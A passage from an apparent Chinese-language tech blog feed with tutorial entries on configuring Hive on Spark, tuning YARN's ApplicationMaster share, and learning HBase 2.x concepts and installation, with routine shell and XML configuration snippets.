class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>其他优化：</p><p>参考1：<a href="https://docs.cloudera.com/documentation/enterprise/6/6.3/topics/admin_hos_tuning.html#hos_tuning" target="_blank" rel="noopener" title="https://docs.cloudera.com/documentation/enterprise/6/6.3/topics/admin_hos_tuning.html#hos_tuning">https://docs.cloudera.com/documentation/enterprise/6/6.3/topics/admin_hos_tuning.html#hos_tuning</a></p><p>参考2：<a href="https://cwiki.apache.org/confluence/display/Hive/Hive+on+Spark:+Getting+Started" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/display/Hive/Hive+on+Spark%3A+Getting+Started">https://cwiki.apache.org/confluence/display/Hive/Hive+on+Spark%3A+Getting+Started</a></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、编译环境准备&lt;/h1&gt;
&lt;h2 id=&quot;1、hadoop和hive安装&quot;&gt;1、hadoop和hive安装&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;hive官网版本依赖：&lt;a href=&quot;https://hive.apache.org/general/downloads/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://hive.apache.org/general/downloads/&quot;&gt;https://hive.apache.org/general/downloads/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里都是用了hadoop3.1.3和hive3.1.3版本，具体的安装可以参考之前的文章&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Hive-on-spark编译</title>
    <link href="https://blog.shawncoding.top/posts/2f96e2e4.html"/>
    <id>https://blog.shawncoding.top/posts/2f96e2e4.html</id>
    <published>2024-05-31T08:22:18.000Z</published>
    <updated>2024-05-31T08:31:51.364Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Hive引擎简介">Hive引擎简介</h3><p>Hive引擎包括：默认MR、Tez、Spark</p><ul><li>Hive on Spark：Hive既作为存储元数据又负责SQL的解析优化，<strong>语法是HQL语法</strong>，执行引擎变成了Spark，Spark负责采用RDD执行。</li><li>Spark on Hive : Hive只作为存储元数据，Spark负责SQL解析优化，<strong>语法是Spark SQL语法</strong>，Spark负责采用RDD执行。</li></ul><a id="more"></a><h3 id="Hive-on-Spark配置">Hive on Spark配置</h3><p><strong>兼容性说明</strong></p><blockquote><p>注意：官网下载的Hive3.1.2和Spark3.0.0默认是不兼容的。因为Hive3.1.2支持的Spark版本是2.4.5，所以需要我们重新编译Hive3.1.2版本。编译步骤：官网下载Hive3.1.2源码，修改pom文件中引用的Spark版本为3.0.0，如果编译通过，直接打包获取jar包。如果报错，就根据提示，修改相关方法，直到不报错，打包获取jar包。</p></blockquote><p><strong>在Hive所在节点部署Spark</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传并解压解压spark-3.0.0-bin-hadoop3.2.tgz</span></span><br><span class="line">tar -zxvf spark-3.0.0-bin-hadoop3.2.tgz -C /opt/module/</span><br><span class="line">mv /opt/module/spark-3.0.0-bin-hadoop3.2 /opt/module/spark</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置SPARK_HOME环境变量</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 添加如下内容</span></span><br><span class="line"><span class="comment"># SPARK_HOME</span></span><br><span class="line"><span class="built_in">export</span> SPARK_HOME=/opt/module/spark</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$SPARK_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># source 使其生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/my_env.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在hive中创建spark配置文件</span></span><br><span class="line">vim /opt/module/hive/conf/spark-defaults.conf</span><br><span class="line"><span class="comment"># 添加如下内容（在执行任务时，会根据如下参数执行）</span></span><br><span class="line">spark.master                               yarn</span><br><span class="line">spark.eventLog.enabled                   <span class="literal">true</span></span><br><span class="line">spark.eventLog.dir                        hdfs://hadoop102:8020/spark-history</span><br><span class="line">spark.executor.memory                    1g</span><br><span class="line">spark.driver.memory             1g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建好目录</span></span><br><span class="line">hadoop fs -mkdir /spark-history</span><br></pre></td></tr></table></figure><p><strong>向HDFS上传Spark纯净版jar包</strong></p><p>说明1：由于Spark3.0.0非纯净版默认支持的是hive2.3.7版本，直接使用会和安装的Hive3.1.2出现兼容性问题。所以采用Spark纯净版jar包，不包含hadoop和hive相关依赖，避免冲突。</p><p>说明2：Hive任务最终由Spark来执行，Spark任务资源分配由Yarn来调度，该任务有可能被分配到集群的任何一个节点。所以需要将Spark的依赖上传到HDFS集群路径，这样集群中任何一个节点都能获取到。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传并解压spark-3.0.0-bin-without-hadoop.tgz</span></span><br><span class="line">tar -zxvf /opt/software/spark-3.0.0-bin-without-hadoop.tgz</span><br><span class="line"><span class="comment"># 上传Spark纯净版jar包到HDFS</span></span><br><span class="line">hadoop fs -mkdir /spark-jars</span><br><span class="line">hadoop fs -put spark-3.0.0-bin-without-hadoop/jars/* /spark-jars</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改hive-site.xml文件</span></span><br><span class="line">vim /opt/module/hive/conf/hive-site.xml</span><br><span class="line">&lt;!--Spark依赖位置（注意：端口号8020必须和namenode的端口号一致）--&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;spark.yarn.jars&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hdfs://hadoop102:8020/spark-jars/*&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;!--Hive执行引擎--&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hive.execution.engine&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;spark&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p><strong>Hive on Spark</strong>测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动hive客户端</span></span><br><span class="line">bin/hive</span><br><span class="line"><span class="comment"># 创建一张测试表</span></span><br><span class="line">hive (default)&gt; create table student(id int, name string);</span><br><span class="line"><span class="comment"># 通过insert测试效果</span></span><br><span class="line">hive (default)&gt; insert into table student values(1,<span class="string">'abc'</span>);</span><br></pre></td></tr></table></figure><h3 id="Yarn环境配置">Yarn环境配置</h3><p><strong>增加ApplicationMaster</strong>资源比例</p><p>容量调度器对每个资源队列中同时运行的Application Master占用的资源进行了限制，该限制通过yarn.scheduler.capacity.maximum-am-resource-percent参数实现，其默认值是0.1，表示每个资源队列上Application Master最多可使用的资源为该队列总资源的10%，目的是防止大部分资源都被Application Master占用，而导致Map/Reduce Task无法执行。</p><p>生产环境该参数可使用默认值。但学习环境，集群资源总数很少，如果只分配10%的资源给Application Master，则可能出现，同一时刻只能运行一个Job的情况，因为一个Application Master使用的资源就可能已经达到10%的上限了。故此处可将该值适当调大。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在hadoop102的/opt/module/hadoop-3.1.3/etc/hadoop/capacity-scheduler.xml文件中修改如下参数值</span></span><br><span class="line">vim capacity-scheduler.xml</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.scheduler.capacity.maximum-am-resource-percent&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;0.8&lt;/value&gt;</span><br><span class="line">&lt;/property</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分发capacity-scheduler.xml配置文件</span></span><br><span class="line">xsync capacity-scheduler.xml</span><br><span class="line"><span class="comment"># 关闭正在运行的任务，重新启动yarn集群</span></span><br><span class="line">sbin/stop-yarn.sh</span><br><span class="line">sbin/start-yarn.sh</span><br></pre></td></tr></table></figure><p><strong>DataGrip</strong> <strong>ODS层部分表字段显示异常</strong></p><p>建表字段中有如下语句的表字段无法显示。</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>上述语句指定了Hive表的序列化器和反序列化器SERDE（serialization 和 deserialization的合并缩写），用于解析 JSON 格式的文件。上述 SERDE 是由第三方提供的，在hive-site.xml中添加如下配置即可解决。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>metastore.storage.schema.reader.impl<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.hive.metastore.SerDeStorageSchemaReader<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;Hive引擎简介&quot;&gt;Hive引擎简介&lt;/h3&gt;
&lt;p&gt;Hive引擎包括：默认MR、Tez、Spark&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Hive on Spark：Hive既作为存储元数据又负责SQL的解析优化，&lt;strong&gt;语法是HQL语法&lt;/strong&gt;，执行引擎变成了Spark，Spark负责采用RDD执行。&lt;/li&gt;
&lt;li&gt;Spark on Hive : Hive只作为存储元数据，Spark负责SQL解析优化，&lt;strong&gt;语法是Spark SQL语法&lt;/strong&gt;，Spark负责采用RDD执行。&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>HBase2.x学习笔记</title>
    <link href="https://blog.shawncoding.top/posts/173d955f.html"/>
    <id>https://blog.shawncoding.top/posts/173d955f.html</id>
    <published>2024-05-31T08:22:10.000Z</published>
    <updated>2024-05-31T08:31:07.150Z</updated>
    
    <content type="html"><![CDATA[<h1>一、HBase 简介</h1><h2 id="1、HBase-定义">1、HBase 定义</h2><blockquote><p>官网：<a href="https://hbase.apache.org/" target="_blank" rel="noopener" title="https://hbase.apache.org/">https://hbase.apache.org/</a></p></blockquote><h3 id="1-1-概述">1.1 概述</h3><p>HBase 是 BigTable 的开源 Java 版本。<strong>是建立在 HDFS 之上</strong>，提供高可靠性、高性能、列存储、可伸缩、实时读写 NoSql 的数据库系统。它介于 NoSql 和 RDBMS 之间，仅能通过主键(row key)和主键的 range 来检索数据，仅支持单行事务(可通过 hive 支持来实现多表 join 等复杂操作)。</p><a id="more"></a><p>主要用来存储结构化和半结构化的松散数据。Hbase 查询数据功能很简单，不支持 join 等复杂操作，不支持复杂的事务（行级的事务） Hbase 中支持的数据类型：byte[] 与 hadoop 一样，Hbase 目标主要依靠<strong>横向扩展</strong>，通过不断增加廉价的商用服务器，来增加计算和存储能力。HBase 中的表一般有这样的特点：</p><ul><li>大：一个表可以有上十亿行，上百万列</li><li>面向列:面向列(族)的存储和权限控制，列(族)独立检索。</li><li>稀疏:对于为空(null)的列，并不占用存储空间，因此，表可以设计的非常稀疏</li></ul><h3 id="1-2-HBase-与-Hadoop-的关系">1.2 HBase 与 Hadoop 的关系</h3><p><strong>HDFS</strong></p><ul><li>为分布式存储提供文件系统</li><li>针对存储大尺寸的文件进行优化，不需要对 HDFS 上的文件进行随机读写</li><li>直接使用文件</li><li>数据模型不灵活</li><li>使用文件系统和处理框架</li><li>优化一次写入，多次读取的方式</li></ul><p><strong>HBase</strong></p><ul><li>提供表状的面向列的数据存储</li><li>针对表状数据的随机读写进行优化</li><li>使用 key-value 操作数据</li><li>提供灵活的数据模型</li><li>使用表状存储，支持 MapReduce，依赖 HDFS</li><li>优化了多次读，以及多次写</li></ul><h3 id="1-3-RDBMS-与-HBase-的对比">1.3 RDBMS 与 HBase 的对比</h3><p><strong>关系型数据库</strong></p><p><em><strong>结构</strong></em>：</p><ul><li>数据库以表的形式存在</li><li>支持 FAT、NTFS、EXT、文件系统</li><li>使用 Commit log 存储日志</li><li>参考系统是坐标系统</li><li>使用主键（PK）</li><li>支持分区</li><li>使用行、列、单元格</li></ul><p><em><strong>功能</strong></em>：</p><ul><li>支持向上扩展</li><li>使用 SQL 查询</li><li>面向行，即每一行都是一个连续单元</li><li>数据总量依赖于服务器配置</li><li>具有 ACID 支持</li><li>适合结构化数据</li><li>传统关系型数据库一般都是中心化的</li><li>支持事务</li><li>支持 Join</li></ul><p><strong>HBase</strong></p><p><em><strong>结构</strong></em>：</p><ul><li>数据库以 region 的形式存在</li><li>支持 HDFS 文件系统</li><li>使用 WAL（Write-Ahead Logs）存储日志</li><li>参考系统是 Zookeeper</li><li>使用行键（row key）</li><li>支持分片</li><li>使用行、列、列族和单元格</li></ul><p><em><strong>功能</strong></em>：</p><ul><li>支持向外扩展</li><li>使用 API 和 MapReduce 来访问 HBase 表数据</li><li>面向列，即每一列都是一个连续的单元</li><li>数据总量不依赖具体某台机器，而取决于机器数量</li><li>HBase 不支持 ACID（Atomicity、Consistency、Isolation、Durability）</li><li>适合结构化数据和非结构化数据</li><li>一般都是分布式的</li><li>HBase 不支持事务</li><li>不支持 Join</li></ul><h3 id="1-4-HBase-特征简要">1.4 HBase 特征简要</h3><ul><li>海量存储</li></ul><p><strong>Hbase 适合存储 PB 级别的海量数据，在 PB 级别的数据以及采用廉价 PC 存储的情况下，能在几十到百毫秒内返回数据</strong>。这与 Hbase 的极易扩展性息息相关。正式因为 Hbase 良好的扩展性，才为海量数据的存储提供了便利。</p><ul><li>列式存储</li></ul><p>这里的列式存储其实说的是列族存储，Hbase 是根据列族来存储数据的。列族下面可以有非常多的列，列族在创建表的时候就必须指定</p><ul><li>极易扩展</li></ul><p>Hbase 的扩展性主要体现在两个方面，一个是基于上层处理能力（RegionServer）的扩展，一个是基于存储的扩展（HDFS）。 通过横向添加 RegionSever 的机器，进行水平扩展，提升 Hbase 上层的处理能力，提升 Hbsae 服务更多 Region 的能力。 备注：RegionServer 的作用是管理 region、承接业务的访问，这个后面会详细的介绍通过横向添加 Datanode 的机器，进行存储层扩容，提升 Hbase 的数据存储能力和提升后端存储的读写能力</p><ul><li>高并发</li></ul><p>由于目前大部分使用 Hbase 的架构，都是采用的廉价 PC，因此单个 IO 的延迟其实并不小，一般在几十到上百 ms 之间。这里说的高并发，主要是在并发的情况下，Hbase 的单个 IO 延迟下降并不多。能获得高并发、低延迟的服务</p><ul><li>稀疏</li></ul><p>稀疏主要是针对 Hbase 列的灵活性，在列族中，你可以指定任意多的列，在列数据为空的情况下，是不会占用存储空间的</p><h2 id="2、HBase-数据模型">2、HBase 数据模型</h2><p>HBase 的设计理念依据 Google 的 BigTable 论文，论文中对于数据模型的首句介绍：<strong>Bigtable 是一个稀疏的、分布式的、持久的多维排序 map</strong>。之后对于映射的解释如下：<strong>该映射由行键、列键和时间戳索引；映射中的每个值都是一个未解释的字节数组</strong>。最终 HBase 关于数据模型和 BigTable 的对应关系如下：<strong>HBase 使用与 Bigtable 非常相似的数据模型。用户将数据行存储在带标签的表中。数据行具有可排序的键和任意数量的列。该表存储稀疏，因此如果用户喜欢，同一表中的行可以具有疯狂变化的列</strong>。</p><p>最终理解 HBase 数据模型的关键在于稀疏、分布式、多维、排序的映射。其中映射 map指代非关系型数据库的 key-Value 结构</p><h3 id="2-1-HBase-逻辑结构">2.1 HBase 逻辑结构</h3><p>HBase 可以用于存储多种结构的数据，以 JSON 为例，存储的数据原貌为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"row_key1"</span>: &#123;</span><br><span class="line">    <span class="attr">"personal_info"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"zhangsan"</span>,</span><br><span class="line">      <span class="attr">"city"</span>: <span class="string">" 北 京 "</span>,</span><br><span class="line">      <span class="attr">"phone"</span>: <span class="string">"131********"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"office_info"</span>: &#123;</span><br><span class="line">      <span class="attr">"tel"</span>: <span class="string">"010-1111111"</span>,</span><br><span class="line">      <span class="attr">"address"</span>: <span class="string">"atguigu"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"row_key11"</span>: &#123;</span><br><span class="line">    <span class="attr">"personal_info"</span>: &#123;</span><br><span class="line">      <span class="attr">"city"</span>: <span class="string">" 上 海 "</span>,</span><br><span class="line">      <span class="attr">"phone"</span>: <span class="string">"132********"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"office_info"</span>: &#123;</span><br><span class="line">      <span class="attr">"tel"</span>: <span class="string">"010-1111111"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"row_key2"</span>:&#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202404151820788.png" alt></p><h3 id="2-2-HBase-物理存储结构">2.2 HBase 物理存储结构</h3><p>物理存储结构即为数据映射关系，而在概念视图的空单元格，底层实际根本不存储</p><p><img src="http://qnypic.shawncoding.top/blog/202404151820789.png" alt></p><h3 id="2-3-HBase的表数据模型">2.3 HBase的表数据模型</h3><ul><li><strong>Name Space</strong></li></ul><p>命名空间，类似于关系型数据库的 database 概念，每个命名空间下有多个表。HBase 两个自带的命名空间，分别是 hbase 和 default，hbase 中存放的是 HBase 内置的表，default表是用户默认使用的命名空间</p><ul><li><strong>Table</strong></li></ul><p>类似于关系型数据库的表概念。不同的是，HBase 定义表时只需要声明列族即可，不需要声明具体的列。因为数据存储时稀疏的，所有往 HBase 写入数据时，字段可以<strong>动态、按需指定</strong>。因此，和关系型数据库相比，HBase 能够轻松应对字段变更的场景</p><ul><li><strong>行键 Row Key</strong></li></ul><p>HBase 表中的每行数据都由一个 <strong>RowKey</strong> 和多个 <strong>Column</strong>（列）组成，数据是按照 RowKey 的字典顺序存储的，并且查询数据时只能根据 RowKey 进行检索，所以 RowKey 的设计十分重要。与nosql数据库一样,row key是用来检索记录的主键。访问hbase table中的行，只有三种方式：</p><ol><li>通过单个row key访问</li><li>通过row key的range</li><li>全表扫描</li></ol><p>Row Key 行键可以是任意字符串(<strong>最大长度是 64KB</strong>，实际应用中长度一般为 10-100bytes)，在hbase内部，row key保存为字节数组。<strong>Hbase会对表中的数据按照rowkey排序(字典顺序)</strong>。存储时，数据按照Row key的字典序(byte order)排序存储。设计key时，要充分排序存储这个特性，将经常一起读取的行存储放到一起。(位置相关性)。</p><p>注意： 字典序对int排序的结果是 1,10,100,11,12,13,14,15,16,17,18,19,2,20,21 … 。<strong>要保持整形的自然序，行键必须用0作左填充。行的一次读写是原子操作 (不论一次读写多少列)</strong>。这个设计决策能够使用户很容易的理解程序在对同一个行进行并发更新操作时的行为。</p><ul><li><strong>列族 Column Family</strong></li></ul><p><strong>HBase表中的每个列，都归属于某个列族</strong>。列族是表的schema的一部分(而列不是)，<strong>必须在使用表之前定义</strong>。列名都以列族作为前缀。例如 courses:history ， courses:math 都属于 courses 这个列族。</p><p><strong>访问控制、磁盘和内存的使用统计都是在列族层面进行的。 列族越多，在取一行数据时所要参与IO、搜寻的文件就越多，所以，如果没有必要，不要设置太多的列族。</strong></p><ul><li><strong>列 Column</strong></li></ul><p>HBase 中的每个列都由 **Column Family(列族)**和 **Column Qualifier（列限定符）**进行限定，例如 info：name，info：age。建表时，只需指明列族，而列限定符无需预先定义</p><ul><li><strong>时间戳 Timestamp</strong></li></ul><p>HBase中通过row和columns确定的为一个存贮单元称为cell。每个 cell都保存着同一份数据的多个版本。版本通过时间戳来索引。时间戳的类型是 64位整型。<strong>时间戳可以由hbase(在数据写入时自动 )赋值</strong>，此时时间戳是精确到毫秒的当前系统时间。时间戳也可以由客户显式赋值。如果应用程序要避免数据版本冲突，就必须自己生成具有唯一性的时间戳。<strong>每个 cell中，不同版本的数据按照时间倒序排序</strong>，即最新的数据排在最前面。为了避免数据存在过多版本造成的的管理 (包括存贮和索引)负担，hbase提供了两种数据版本回收方式：</p><ol><li>保存数据的最后n个版本</li><li>保存最近一段时间内的版本（设置数据的生命周期TTL）</li></ol><p>用户可以针对每个列族进行设置</p><ul><li><strong>单元 Cell</strong></li></ul><p>由<code>{rowkey, column Family:column Qualifier, timestamp}</code> 唯一确定的单元。cell 中的数据全部是字节码形式存贮</p><ul><li><strong>版本号 VersionNum</strong></li></ul><p>数据的版本号，每条数据可以有多个版本号，默认值为系统时间戳，类型为Long</p><h2 id="3、HBase-基本架构">3、HBase 基本架构</h2><p><img src="http://qnypic.shawncoding.top/blog/202404151820791.png" alt></p><h3 id="3-1-Master">3.1 Master</h3><p>实现类为 <strong>HMaster</strong>，负责监控集群中所有的 RegionServer 实例。主要作用如下：</p><ul><li>管理元数据表格 hbase:meta，接收用户对表格创建修改删除的命令并执行</li><li>监控 region 是否需要进行负载均衡，故障转移和 region 的拆分；通过启动多个后台线程监控实现上述功能：<ul><li>LoadBalancer 负载均衡器：周期性监控 region 分布在 regionServer 上面是否均衡，由参数 hbase.balancer.period 控制周期时间，默认 5 分钟。</li><li>CatalogJanitor 元数据管理器：定期检查和清理 hbase:meta 中的数据。meta 表内容在进阶中介绍</li><li>MasterProcWAL master 预写日志处理器：把 master 需要执行的任务记录到预写日志 WAL 中，如果 master 宕机，让 backupMaster读取日志继续干</li></ul></li></ul><p><strong>总结</strong></p><ul><li>监控 RegionServer</li><li>处理 RegionServer 故障转移</li><li>处理元数据的变更</li><li>处理 region 的分配或移除</li><li>在空闲时间进行数据的负载均衡</li><li>通过 Zookeeper 发布自己的位置给客户端</li></ul><h3 id="3-2-Region-Server">3.2 Region Server</h3><p>Region Server 实现类为 HRegionServer，主要作用如下:</p><ul><li>负责存储 HBase 的实际数据</li><li>处理分配给它的 Region</li><li>刷新缓存到 HDFS</li><li>维护 HLog</li><li>执行压缩</li><li>负责处理 Region 分片</li></ul><p>几个组件如下</p><ul><li><strong>Write-Ahead logs</strong></li></ul><p>HBase 的修改记录，当对 HBase 读写数据的时候，数据不是直接写进磁盘，它会在内存中保留一段时间（时间以及数据量阈值可以设定）。但把数据保存在内存中可能有更高的概率引起数据丢失，为了解决这个问题，数据会先写在一个叫做 Write-Ahead logfile 的文件中，然后再写入内存中。所以在系统出现故障的时候，数据可以通过这个日志文件重建</p><ul><li><strong>HFile</strong></li></ul><p>这是在磁盘上保存原始数据的实际的物理文件，是实际的存储文件</p><ul><li><strong>Store</strong></li></ul><p>HFile 存储在 Store 中，一个 Store 对应 HBase 表中的一个列族。</p><ul><li><strong>MemStore</strong></li></ul><p>顾名思义，就是内存存储，位于内存中，用来保存当前的数据操作，所以当数据保存在 WAL 中之后，RegsionServer 会在内存中存储键值对</p><ul><li><strong>Region</strong></li></ul><p>Hbase 表的分片，HBase 表会根据 RowKey 值被切分成不同的 region 存储在 RegionServer 中，在一个 RegionServer 中可以有多个不同的 region</p><h3 id="3-3-Zookeeper">3.3 Zookeeper</h3><p>HBase 通过 Zookeeper 来做 master 的高可用、记录 RegionServer 的部署信息、并且存储有 meta 表的位置信息。</p><p>HBase 对于数据的读写操作时直接访问 Zookeeper 的，在 2.3 版本推出 Master Registry模式，客户端可以直接访问 master。使用此功能，会加大对 master 的压力，减轻对 Zookeeper的压力。</p><h3 id="3-4-HDFS">3.4 HDFS</h3><p>HDFS 为 Hbase 提供最终的底层数据存储服务，同时为 HBase 提供高容错的支持</p><h1>二、HBase 快速入门</h1><h2 id="1、HBase-安装部署">1、HBase 安装部署</h2><h3 id="1-1-前置环境与下载">1.1 前置环境与下载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># HBase启动需要有zookeeper和hadoop，这个可以参考之前的文章</span></span><br><span class="line"><span class="comment"># 三台服务器开启zookeeper</span></span><br><span class="line">bin/zkServer.sh start</span><br><span class="line"><span class="comment"># 开启hadoop</span></span><br><span class="line">sbin/start-dfs.sh</span><br><span class="line">sbin/start-yarn.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后下载hbase</span></span><br><span class="line"><span class="comment"># https://archive.apache.org/dist/hbase/</span></span><br><span class="line">wget https://archive.apache.org/dist/hbase/2.4.11/hbase-2.4.11-bin.tar.gz</span><br><span class="line">tar -zxvf hbase-2.4.11-bin.tar.gz -C /opt/module/</span><br><span class="line">mv /opt/module/hbase-2.4.11 /opt/module/hbase</span><br><span class="line"><span class="comment"># 配置环境变量</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 添加</span></span><br><span class="line"><span class="comment">#HBASE_HOME</span></span><br><span class="line"><span class="built_in">export</span> HBASE_HOME=/opt/module/hbase</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HBASE_HOME</span>/bin</span><br><span class="line"><span class="comment"># 使用 source 让配置的环境变量生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/my_env.sh</span><br></pre></td></tr></table></figure><h3 id="1-2-HBase-的配置文件">1.2 HBase 的配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/module/hbase/conf</span><br><span class="line"><span class="comment"># hbase-env.sh 修改内容</span></span><br><span class="line">vim hbase-env.sh</span><br><span class="line"><span class="comment"># hbase-env.sh 修改内容，可以添加到最后，默认是依赖自己，即开箱即用</span></span><br><span class="line"><span class="built_in">export</span> HBASE_MANAGES_ZK=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>修改hbase-site.xml ,<code>vim hbase-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 